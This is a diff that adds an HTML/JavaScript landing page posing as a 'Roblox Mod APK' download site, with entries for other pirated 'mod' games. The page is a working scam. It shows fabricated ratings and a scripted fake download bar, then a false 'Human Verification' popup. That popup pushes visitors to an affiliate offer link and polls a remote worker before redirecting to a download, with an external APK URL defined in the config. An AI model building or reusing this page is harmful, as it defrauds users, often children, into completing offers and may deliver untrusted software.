@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">  
+<meta name="viewport" content="width=device-width, initial-scale=1.0">  
+<title>Roblox Mod APK V2 – Unlimited Features</title>  
+
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">  
+
+<style>
+  .back-btn {
+  position: fixed;
+  top: 16px;
+  right: 16px;
+  background: var(--accent);
+  color: #fff;
+  padding: 10px 14px;
+  border-radius: 8px;
+  text-decoration: none;
+  font-weight: 600;
+  box-shadow: 0 4px 10px rgba(0,0,0,0.4);
+  transition: transform 0.2s, box-shadow 0.2s;
+  z-index: 9999;
+}
+
+.back-btn:hover {
+  transform: translateY(-2px);
+  box-shadow: 0 6px 14px rgba(0,0,0,0.5);
+}
+
+:root{
+  --bg:#0f0704;
+  --card:#1a0c06;
+  --accent:#ff8b2c;
+  --accent2:#ffb45c;
+  --gold:#ffd58a;
+  --border:#3d1f12;
+}
+body{
+  background:radial-gradient(circle at top,#2a1409 0%,#120905 45%,#080403 100%);
+  margin:0;
+  font-family:Inter,Arial;
+  color:#fff;
+}
+
+*{box-sizing:border-box}
+
+/* ===== HEADER ===== */
+header{
+  padding:16px 22px;
+  display:flex;
+  align-items:center;
+  gap:12px;
+  border-bottom:1px solid var(--border);
+}
+header img{width:36px}
+header span{font-weight:800;font-size:20px}
+
+/* ===== HERO ===== */
+.hero{
+  padding:28px 22px;
+  display:grid;
+  gap:20px;
+}
+.hero img{
+  width:100%;
+  border-radius:22px;
+  animation:float 5s ease-in-out infinite;
+}
+.hero h1{font-size:28px;margin:0}
+.rating{color:var(--gold);font-weight:600}
+.hero p{color:#e7c8a2;font-size:15px}
+
+/* ===== DOWNLOAD BOX ===== */
+.download-box{
+  background:linear-gradient(180deg,#2a1409,#140a05);
+  border-radius:24px;
+  padding:22px;
+  margin:22px;
+  border:1px solid var(--border);
+  box-shadow:0 10px 40px rgba(0,0,0,.6), inset 0 0 25px rgba(255,138,42,.06);
+  animation:softFloat 6s ease-in-out infinite;
+}
+
+.download-box button{
+  width:100%;
+  padding:16px;
+  border:none;
+  border-radius:18px;
+  background:linear-gradient(90deg,var(--accent),var(--accent2));
+  color:#1b0f09;
+  font-size:20px;
+  font-weight:800;
+  cursor:pointer;
+  animation:pulseGlow 2.2s infinite;
+  transition:transform 0.2s ease;
+  margin-bottom:12px; /* مسافة بين الأزرار */
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  flex-direction: row-reverse;
+}
+
+.download-box button img{
+  width:20px;
+  height:20px;
+  margin-left:8px;
+  vertical-align:middle;
+}
+
+.download-box button:hover{
+  transform:scale(1.05);
+}
+
+/* ===== FAKE PROGRESS ===== */
+#fakeLoader{margin-top:16px;display:none}
+#fakeBar{
+  width:100%;
+  height:14px;
+  background:#080403;
+  border-radius:10px;
+  overflow:hidden;
+  border:1px solid var(--border)
+}
+#fakeProgress{
+  height:100%;
+  width:0%;
+  background:linear-gradient(90deg,var(--accent),var(--gold));
+}
+#fakeText,#fakeMeta{
+  margin-top:6px;
+  font-size:14px;
+  color:#e7c8a2;
+  text-align:center
+}
+
+/* ===== FEATURES ===== */
+.features{padding:22px;display:grid;gap:14px}
+.feature{
+  background:linear-gradient(180deg,#221108,#120805);
+  padding:14px 16px;
+  border-radius:14px;
+  font-size:14px;
+  border:1px solid var(--border)
+}
+
+/* ===== FOOTER ===== */
+footer{padding:20px;text-align:center;color:#c4a27a;font-size:13px}
+
+/* ===== POPUP ===== */
+#overlay{
+  position:fixed;
+  inset:0;
+  background:rgba(0,0,0,.85);
+  display:none;
+  justify-content:center;
+  align-items:center;
+  z-index:9999
+}
+#popup{
+  background:linear-gradient(180deg,#2a1409,#140a05);
+  width:92%;
+  max-width:420px;
+  border-radius:22px;
+  padding:24px;
+  text-align:center;
+  border:1px solid var(--border);
+  animation:popupIn .35s ease-out;
+}
+#popup p{font-size:14px;color:#e7c8a2;line-height:1.6}
+
+/* ===== VERIFY BUTTON (NEW ANIMATION) ===== */
+#offerLink{
+  display:block;
+  margin-top:16px;
+  padding:14px;
+  background:linear-gradient(90deg,var(--accent),var(--accent2));
+  border-radius:16px;
+  color:#1b0f09;
+  font-weight:800;
+  text-decoration:none;
+  cursor:pointer;
+  text-align:center;
+  animation:pulseGlow 2.2s infinite;
+  transition:transform 0.2s ease, box-shadow 0.2s ease;
+}
+#offerLink:hover{
+  transform:scale(1.05);
+  box-shadow:0 0 30px rgba(255,138,42,.8);
+}
+
+#popup button{
+  margin-top:12px;
+  background:#b91c1c;
+  border:none;
+  padding:10px 14px;
+  color:#fff;
+  border-radius:12px;
+  cursor:pointer
+}
+
+.popup-status{margin-top:14px;font-weight:700;display:none}
+.popup-status.checking{color:var(--gold)}
+.popup-status.success{color:#22c55e}
+.popup-status.error{color:#ef4444}
+
+.toast-notice{
+  position:fixed;
+  bottom:26px;
+  left:50%;
+  transform:translateX(-50%);
+  background:#3a1f12;
+  color:#fff;
+  padding:14px 18px;
+  border-radius:14px;
+  font-weight:800;
+  font-size:14px;
+  display:none;
+  z-index:10000
+}
+
+/* ===== ANIMATIONS ===== */
+@keyframes pulseGlow{
+  0%{box-shadow:0 0 18px rgba(255,138,42,.4)}
+  50%{box-shadow:0 0 38px rgba(255,138,42,.75)}
+  100%{box-shadow:0 0 18px rgba(255,138,42,.4)}
+}
+@keyframes float{
+  0%,100%{transform:translateY(0)}
+  50%{transform:translateY(-10px)}
+}
+@keyframes softFloat{
+  0%,100%{transform:translateY(0)}
+  50%{transform:translateY(-6px)}
+}
+@keyframes popupIn{
+  from{opacity:0;transform:scale(.92)}
+  to{opacity:1;transform:scale(1)}
+}
+
+/* ===== PERFORMANCE BOOST ===== */
+*{
+  -webkit-tap-highlight-color: transparent;
+}
+img{image-rendering:auto;backface-visibility:hidden}
+button{will-change:transform,box-shadow}
+.hero img,.download-box,.feature{transform:translateZ(0);}
+</style>
+</head>
+
+<body>
+<!-- زر الرجوع -->
+<a href="index.html" class="back-btn">← Home</a>
+<header>
+  <img id="gameLogo" src="https://i.imgur.com/iOtA0vX.png">
+  <span id="gameTitle">Roblox</span>
+</header>
+
+<section class="hero">  
+  <img id="gameImage" src="https://i.imgur.com/Vmlcs1B.jpeg">  
+  <h1 id="gameName">Roblox Mod APK V2</h1>  
+  <div id="gameRating" class="rating">★★★★★ 4.9 (128,441 reviews)</div>  
+  <p id="gameDescription">Unlock premium features, enhanced gameplay and exclusive mods.</p>  
+</section>
+
+
+<div class="download-box">  
+  <button id="downloadBtn" onclick="startFakeDownload()">
+    <img src="https://i.imgur.com/0CDI4Yq.png" alt="Android">
+    Download APK
+  </button>  
+
+  <button id="downloadBtn2" onclick="startFakeDownload()">
+    <img src="https://i.imgur.com/OvpX7m5.png" alt="iOS">
+    Download
+  </button>  
+
+  <div id="fakeLoader">  
+    <div id="fakeBar"><div id="fakeProgress"></div></div>  
+    <div id="fakeText">Preparing download…</div>  
+    <div id="fakeMeta">0 MB / 154.27 MB • 0 MB/s</div>  
+  </div>  
+</div>  
+
+<section class="features">  
+<div class="feature">✔ Unlimited Features Enabled</div>  
+<div class="feature">✔ No Root Required</div>  
+<div class="feature">✔ Latest Version</div>  
+<div class="feature">✔ Fast & Secure Download</div>
+</section>  
+
+<footer id="footerText"></footer>
+  
+
+<div id="overlay">  
+<div id="popup">  
+<h2>Human Verification</h2>  
+<p>
+complete one simple step to confirme you are not a Robot.<br><br>
+1: Click "Verify & Continue" and sign up in our verification site.<br>
+2: Return To this page and your download will start automatically.
+</p>
+
+<div id="popupChecking" class="popup-status checking">⏳ Checking verification…</div>  
+<div id="popupError" class="popup-status error">The verification was not completed successfully, please Try again.</div>  
+<div id="popupSuccess" class="popup-status success">✅ Verification completed successfully.<br>Download will start shortly…</div>  
+
+<a id="offerLink" target="_blank" onclick="markWentOffer()">Verify & Continue</a>  
+<button onclick="closePopup()">Cancel</button>  
+</div>  
+</div>  
+
+<div id="closeNotice" class="toast-notice">
+Please complete the verification process and the download will be completed automatically⚠️.
+</div>
+
+<script>
+  // بيانات كل لعب
+  const gamesData = {
+  RobloxMod:{
+    title:"Roblox Mod APK V2",
+    image:"https://i.imgur.com/Vmlcs1B.jpeg",
+    rating:"★★★★★",
+    views:"128,441 reviews",
+    description:"Unlock premium features, enhanced gameplay and exclusive mods.",
+    downloadAndroid:"#",
+    downloadiOS:"#",
+    logo:"https://i.imgur.com/iOtA0vX.png"
+  },
+  MinecraftMod:{
+    title:"Minecraft Mod APK",
+    image:"https://i.imgur.com/abc123.jpeg",
+    rating:"★★★★★",
+    views:"98,221 reviews",
+    description:"Enjoy mods and unlimited features.",
+    downloadAndroid:"#",
+    downloadiOS:"#",
+    logo:"https://i.imgur.com/iOtA0vX.png"
+  },
+  AmongUsMod:{
+    title:"Among Us Mod APK",
+    image:"https://i.imgur.com/xyz789.jpeg",
+    rating:"★★★★☆",
+    views:"56,123 reviews",
+    description:"Play with unlimited colors and pets.",
+    downloadAndroid:"#",
+    downloadiOS:"#",
+    logo:"https://i.imgur.com/iOtA0vX.png"
+  },
+  GTA5Mobile:{
+    title:"GTA 5 Mobile",
+    image:"https://www5.0zz0.com/2023/10/15/08/332140079.jpeg",
+    rating:"★★★★☆",
+    views:"45,332 reviews",
+    description:"Experience GTA 5 on mobile with all missions unlocked.",
+    downloadAndroid:"#",
+    downloadiOS:"#",
+    logo:"https://i.imgur.com/iOtA0vX.png"
+  },
+  GTAViceCity:{
+    title:"GTA Vice City",
+    image:"https://i.postimg.cc/gjzQQ2sb/1680953248-gtavc.png",
+    rating:"★★★★☆",
+    views:"39,221 reviews",
+    description:"Classic GTA Vice City with mods and unlimited money.",
+    downloadAndroid:"#",
+    downloadiOS:"#",
+    logo:"https://i.imgur.com/iOtA0vX.png"
+  },
+  AssettoCorsaMobile:{
+    title:"Assetto Corsa Mobile",
+    image:"https://i.postimg.cc/3xHVQWW0/Picsart-25-02-25-00-54-38-367-1.jpg",
+    rating:"★★★★★",
+    views:"28,123 reviews",
+    description:"Race with realistic physics and all cars unlocked.",
+    downloadAndroid:"#",
+    downloadiOS:"#",
+    logo:"https://i.imgur.com/iOtA0vX.png"
+  },
+  BeamNGdriveMobile:{
+    title:"BeamNG.drive Mobile",
+    image:"https://i.postimg.cc/k5skc9J6/Picsart-25-03-08-05-57-01-681.jpg",
+    rating:"★★★★☆",
+    views:"22,112 reviews",
+    description:"Realistic vehicle physics and crash simulations.",
+    downloadAndroid:"#",
+    downloadiOS:"#",
+    logo:"https://i.imgur.com/iOtA0vX.png"
+  },
+  ForzaHorizon5:{
+    title:"Forza Horizon 5",
+    image:"https://sm.ign.com/ign_nordic/cover/f/forza-hori/forza-horizon-5_5jjv.jpg",
+    rating:"★★★★☆",
+    views:"30,221 reviews",
+    description:"Open world racing with all cars unlocked.",
+    downloadAndroid:"#",
+    downloadiOS:"#",
+    logo:"https://i.imgur.com/iOtA0vX.png"
+  },
+  EuroTruckSimulator2:{
+    title:"Euro Truck Simulator 2",
+    image:"https://i.postimg.cc/kXfCsxTX/32aee5919f1c4e81da58627d21b3323a.jpg",
+    rating:"★★★★☆",
+    views:"18,332 reviews",
+    description:"Drive across Europe with realistic trucks and mods.",
+    downloadAndroid:"#",
+    downloadiOS:"#",
+    logo:"https://i.imgur.com/iOtA0vX.png"
+  },
+  HollowKnight:{
+    title:"Hollow Knight: Silksong",
+    image:"https://i.postimg.cc/Mpm2MDqF/Fr-Mkduml-Mozlmzk-APFqq-D1y-Gwo-OJ.webp",
+    rating:"★★★★★",
+    views:"15,221 reviews",
+    description:"Explore new worlds with all abilities unlocked.",
+    downloadAndroid:"#",
+    downloadiOS:"#",
+    logo:"https://i.imgur.com/iOtA0vX.png"
+  },
+  ValorantMobile:{
+    title:"Valorant Mobile",
+    image:"https://i.postimg.cc/9O0xhxO.jpeg",
+    rating:"★★★★☆",
+    views:"12,441 reviews",
+    description:"Play Valorant on mobile with unlimited skins.",
+    downloadAndroid:"#",
+    downloadiOS:"#",
+    logo:"https://i.imgur.com/iOtA0vX.png"
+  }
+};
+
+  let FINAL_DOWNLOAD = "";
+
+const urlParams = new URLSearchParams(window.location.search);
+const gameId = urlParams.get("id");
+
+if (gamesData[gameId]) {
+  const game = gamesData[gameId];
+  document.getElementById("gameTitle").innerText = game.title;
+  document.getElementById("gameLogo").src = game.logo;
+  document.getElementById("gameImage").src = game.image;
+  document.getElementById("gameName").innerText = game.title;
+  document.getElementById("gameRating").innerText = `${game.rating} ${game.views}`;
+  document.getElementById("gameDescription").innerText = game.description;
+
+  document.getElementById('downloadBtn').onclick = () => {
+    FINAL_DOWNLOAD = game.downloadAndroid;
+    startFakeDownload();
+  };
+  document.getElementById('downloadBtn2').onclick = () => {
+    FINAL_DOWNLOAD = game.downloadiOS;
+    startFakeDownload();
+  };
+  
+  // تحديث الشعار وعنوان اللعبة في الفوتر
+  document.getElementById('footerText').textContent = `© 2025 ${game.title}`;
+} else {
+  console.error("Game ID not found!");
+}
+
+
+/* ====== URL CLEANUP ====== */
+(function stripTrackers(){
+  const cleanParams=["fbclid","gclid","ttclid","utm_source","utm_campaign"];
+  const url=new URL(window.location.href);
+  let changed=false;
+  cleanParams.forEach(p=>{
+    if(url.searchParams.has(p)){
+      url.searchParams.delete(p);
+      changed=true;
+    }
+  });
+  if(changed){
+    window.history.replaceState({},document.title,url.pathname+url.search);
+  }
+})();
+
+/* ====== CONFIG ====== */
+const WORKER="https://long-term-6789.yoursnagh.workers.dev";
+const OFFER="https://price-low.eu/a/OY9r6H2BVWck0wE";
+const FINAL="https://www.mediafire.com/file/zgz94drk7y3v67k/Rblx-Modv2-GamesteelStudio.apk/file";
+const OFFER_ID="smartlink_1";
+const SUBID_TTL=86400000;
+
+let timer=null,verifyInterval=null;
+let subid=null,loadedMB=0;
+const totalMB=154.27,SPEED_MBPS=8.9;
+
+/* ====== HELPERS ====== */
+function cleanURL(url){
+  const u=new URL(url);
+  ["fbclid","gclid","ttclid","utm_source","utm_campaign"].forEach(p=>{
+    u.searchParams.delete(p);
+  });
+  return u.toString();
+}
+
+function markWentOffer(){
+  localStorage.setItem("went_offer","1");
+}
+
+function createSubid(){
+  subid="rbx_"+Math.random().toString(36).slice(2,10);
+  localStorage.setItem("subid",subid);
+  localStorage.setItem("subid_payload",JSON.stringify({
+    id:subid,offer:OFFER_ID,time:Date.now()
+  }));
+  offerLink.href=cleanURL(OFFER)+"?ml_sub1="+subid;
+}
+
+function isSubidExpired(){
+  const raw=localStorage.getItem("subid_payload");
+  if(!raw) return true;
+  try{
+    const d=JSON.parse(raw);
+    return(Date.now()-d.time)>SUBID_TTL;
+  }catch(e){return true;}
+}
+
+function resetDownloader(){
+  clearInterval(timer);
+  clearInterval(verifyInterval);
+  fakeLoader.style.display="none";
+  fakeProgress.style.width="0%";
+  fakeText.textContent="Preparing download…";
+  fakeMeta.textContent=`0 MB / ${totalMB} MB • 0 MB/s`;
+  downloadBtn.disabled=false;
+  loadedMB=0;
+}
+
+function startFakeDownload(){
+  resetDownloader();
+  createSubid();
+  fakeLoader.style.display="block";
+  downloadBtn.disabled=true;
+  timer=setInterval(()=>{
+    loadedMB=Math.min(totalMB,loadedMB+SPEED_MBPS);
+    fakeProgress.style.width=(loadedMB/totalMB*100)+"%";
+    fakeMeta.textContent=`${loadedMB.toFixed(1)} MB / ${totalMB} MB • ${SPEED_MBPS} MB/s`;
+    if(loadedMB>=totalMB){
+      clearInterval(timer);
+      overlay.style.display="flex";
+      startVerifyPolling();
+    }
+  },500);
+}
+
+function closePopup(){
+  overlay.style.display="none";
+  resetDownloader();
+  localStorage.removeItem("subid");
+  localStorage.removeItem("subid_payload");
+  localStorage.removeItem("went_offer");
+}
+
+function showChecking(){
+  popupChecking.style.display="block";
+  popupError.style.display="none";
+  popupSuccess.style.display="none";
+}
+function showError(){
+  popupChecking.style.display="none";
+  popupError.style.display="block";
+}
+function showSuccess(){
+  popupChecking.style.display="none";
+  popupSuccess.style.display="block";
+}
+
+function startVerifyPolling(){
+  clearInterval(verifyInterval);
+  verifyInterval=setInterval(async()=>{
+    subid=subid||localStorage.getItem("subid");
+    if(!subid) return;
+    showChecking();
+    const r=await fetch(WORKER+"/verify?subid="+subid);
+    const t=(await r.text()).trim();
+    if(t==="verified"){
+      clearInterval(verifyInterval);
+      showSuccess();
+      localStorage.removeItem("subid");
+      localStorage.removeItem("subid_payload");
+      localStorage.removeItem("went_offer");
+      setTimeout(()=>location.href=FINAL_DOWNLOAD,1200);
+      
+    }else{
+      if(localStorage.getItem("went_offer")==="1"){
+        showError();
+      }
+    }
+  },2000);
+}
+
+document.addEventListener("visibilitychange",()=>{
+  if(!document.hidden){
+    startVerifyPolling();
+  }
+});
+
+window.addEventListener("pageshow",()=>{
+  startVerifyPolling();
+});
+
+window.addEventListener("load",()=>{
+  if(isSubidExpired()){
+    localStorage.removeItem("subid");
+    localStorage.removeItem("subid_payload");
+    localStorage.removeItem("went_offer");
+  }
+  subid=localStorage.getItem("subid");
+  if(subid){
+    offerLink.href=cleanURL(OFFER)+"?ml_sub1="+subid;
+    overlay.style.display="flex";
+    startVerifyPolling();
+  }
+});
+  
+</script>
+<script src="antiCopy.js"></script>
+
+</body>
+</html>
